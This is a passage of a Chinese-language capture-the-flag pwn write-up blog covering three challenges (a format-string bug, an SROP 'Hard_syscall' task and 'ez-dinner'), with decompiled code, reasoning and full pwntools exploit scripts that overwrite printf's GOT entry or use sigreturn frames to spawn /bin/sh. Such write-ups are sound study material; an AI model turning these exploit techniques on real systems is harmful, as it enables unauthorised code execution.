  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you have anything you'd like to say to the problem setter?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can only say three sentences."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alright, I haven't received anything now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"And I won't give you a reply in the future either."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v3 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显的格式化字符串漏洞，思路也很明确，先泄露栈地址、libc上函数地址，再利用栈地址找偏移，篡改循环变量i的值为负数，再篡改printf的got表项使其指向system，最后传一个<code>/bin/sh\x00</code>给printf</p>
<p>system和printf的libc地址后三字节不同，选择在一次printf里分两次篡改，幸好read的长度足够，没有卡这点，可以放心的拆分。循环里两次read之间没有输出提示，需要sleep一下调控</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
target_addr <span class="token operator">=</span> <span class="token number">0x401274</span>


<span class="token comment">#io = process('./pwn')</span>
io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span> <span class="token number">52701</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'sentences.'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'%p%p%p%43$p'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
output <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
leaked_stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leak_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

main_addr <span class="token operator">=</span> ret_addr <span class="token operator">-</span> <span class="token number">78</span>
pm_base <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x1288</span>
printf_got <span class="token operator">=</span> pm_base <span class="token operator">+</span> <span class="token number">0x4028</span>
i_addr <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0xf0</span> <span class="token operator">+</span> <span class="token number">0xef</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaked_stack: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leaked_stack<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"i_addr: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak_libc: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"print_got"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
read_addr <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token number">18</span>
system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
lib_base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offset
system_addr <span class="token operator">=</span> lib_base <span class="token operator">+</span> system_offset
binsh_addr <span class="token operator">=</span> lib_base <span class="token operator">+</span> binsh
pop_rdi_ret <span class="token operator">=</span> lib_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rdi:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b''</span>
payload <span class="token operator">+=</span> <span class="token string">b"%200c%10$hhnxxxx"</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>i_addr<span class="token punctuation">)</span>
<span class="token comment">#payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">write_system_faster</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    printf_got2 <span class="token operator">=</span> printf_got <span class="token operator">+</span> <span class="token number">2</span>
    <span class="token comment"># 写入低 2 字节</span>
    low_2_bytes <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
    low_3_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  
    a <span class="token operator">=</span> low_2_bytes <span class="token operator">&amp;</span> <span class="token number">0xff</span>
    adjusted_high_byte <span class="token operator">=</span> low_3_bytes <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> a  <span class="token comment"># 处理回绕</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"low_3_bytes: "</span><span class="token punctuation">,</span>low_3_bytes<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>low_2_bytes<span class="token punctuation">&#125;</span></span><span class="token string">c%12$hn"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adjusted_high_byte<span class="token punctuation">&#125;</span></span><span class="token string">c%13$hhn"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got2<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    

write_system_faster<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>


<span class="token comment">#payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Hard-syscall"><a href="#Hard-syscall" class="headerlink" title="Hard_syscall"></a>Hard_syscall</h2><p>IDA打开之后震惊了，一个极简的程序，出题人是纯汇编写的吗？</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE v1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> Nothing<span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>给了一个充足的栈溢出，但是除此之外啥也没有，经过上一个ret2syscall的暗示，知道又要利用sigreturn了</p>
<p>第一个难点在于虽然可以自由地ROP，自由地跳转到syscall，但是没有正确设置rax的手段……并非，rax是函数的返回值存放的地方，而read函数返回值为读入的字节数，只需要触发一个read，输入15个字节，再跳到syscall就实现了！</p>
<p>接下来的思路依然是用sigreturn执行execve(“/bin/sh\x00”)，这里binsh需要自己写入，正好接着读15字节的机会，再取data段找一个可写的地址塞进去，统统放进SigreturnFrame里</p>
<p>sigreturn会破坏原有的ROP链，很显然原有的rsp rbp都丢掉了，所以第一轮利用之后需要重新布置栈，需要把rip改到read函数处再读一遍，buf改到可控的地方，构建出新的ROP链，也就是再read一遍15字节触发sigreturn把binsh的地址等等传进去，完美<code>cat flag</code></p>
<p>最后一轮的rsp需要设置成一个安全的值，否则归0会崩溃，栈迁移的经验告诉我不一定非得是0x7ff开头的地方<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

read_addr <span class="token operator">=</span> <span class="token number">0x40106A</span>
write_addr <span class="token operator">=</span> <span class="token number">0x401072</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x401035</span>
system_addr <span class="token operator">=</span> <span class="token number">0x040106F</span>
fail_data <span class="token operator">=</span> <span class="token number">0x402000</span>

p_data <span class="token operator">=</span> <span class="token number">0x402008</span>
<span class="token comment">#io = process("./pwn")</span>

io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">49133</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"now!"</span><span class="token punctuation">)</span>

frame1 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame1<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>                  <span class="token comment"># read</span>
frame1<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>                  <span class="token comment"># stdin</span>
frame1<span class="token punctuation">.</span>rsi <span class="token operator">=</span> fail_data          <span class="token comment"># 写目标</span>
frame1<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x140</span>                  
frame1<span class="token punctuation">.</span>rip <span class="token operator">=</span> read_addr          <span class="token comment"># 执行 read</span>
frame1<span class="token punctuation">.</span>rsp <span class="token operator">=</span> p_data


frame2 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame2<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>                  <span class="token comment"># execve</span>
frame2<span class="token punctuation">.</span>rdi <span class="token operator">=</span> fail_data           <span class="token comment"># /bin/sh\x00</span>
<span class="token comment">#frame2.rdx = 0</span>
frame2<span class="token punctuation">.</span>rip <span class="token operator">=</span> system_addr          <span class="token comment"># system</span>
frame2<span class="token punctuation">.</span>rsp <span class="token operator">=</span> p_data             <span class="token comment">#随便写一个</span>

payload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#24</span>

payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> 
payload <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame1<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">15</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


new_stack <span class="token operator">=</span> <span class="token string">b"/bin/sh\x00"</span>
new_stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
new_stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> 
new_stack <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame2<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span>

payload2 <span class="token operator">=</span> <span class="token string">b"/bin/sh"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">8</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="ez-dinner"><a href="#ez-dinner" class="headerlink" title="ez-dinner"></a>ez-dinner</h2><p>两个函数<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">Myinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to ldz's Ciber-Stack-Dinner!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Today's special: Segmentation fault or maybe Nothing happened — served with a stack sauce."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't worry, we saved your return address... maybe..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>再仔细一看<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _QWORD buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">240</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-100h] BYREF</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+100h] [rbp-10h]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+10Ch] [rbp-4h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So please show me your dinner Admission ticket."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to attend this dinner."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name: %lx\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Age:  %lx\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Description: %.*s\n"</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>没有栈溢出，但是有输出，可能会泄露出什么，继续看func2</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h] BYREF</span>
  _QWORD buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+6Ch] [rbp-4h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many dishes would u like to eat?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okey, then What would you like to eat?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> v1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    v3 <span class="token operator">+=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Cooking ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The food is served.\nWish you a happy meal!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  i <span class="token operator">=</span> v3 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v3 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">food1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token function">food2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">food3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要找栈溢出只能从<code>read(0, buf, 8LL * v1);</code>入手，scanf(“%1d”, &amp;v1);强制只能读入一个字节，表面上只能读入0-9实际上如果输入非法字符会被拒收，这样v1就是未初始化的，而func1恰好可以往栈上写入很多东西，于是借此机会把v1改成大数，于是栈溢出就有了</p>
<p>没有后门函数和syscall，给了libc，显然接下来要想办法搞到libc的基址正好可以利用func1的泄露，如果输入没有覆盖，岂不是会读到未定义的东西，试了一下果然出现了libc里的函数地址</p>
<p>接下来就简单了，第二轮的func1没碰太多栈，于是再次进入func2，v1还是未初始化的值，栈溢出依然存在，于是顺理成章ROP即可</p>
<p>一个坑点是，func1的输入<code>\n</code>，由于算输入非法，输入内容没有被接收就还停留在缓冲区里等着下一次输入，然后进了scanf，导致payload被本来发给scanf的字符截胡，可气的是出现了本地gdb里能跑通，退出gdb就跑不通的诡异情况，好一顿排查……其实没有，一调试就是成功，偶然注意到输入输出不对劲才反应过来，gdb把两次输入拼到了一起，而本地和远程都没有！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

ret_addr <span class="token operator">=</span> <span class="token number">0x40129E</span>

binsh <span class="token operator">=</span> <span class="token number">0x4022A3</span>

call_1 <span class="token operator">=</span> <span class="token number">0x4015C6</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x4040A0</span> <span class="token operator">+</span> <span class="token number">0x100</span>
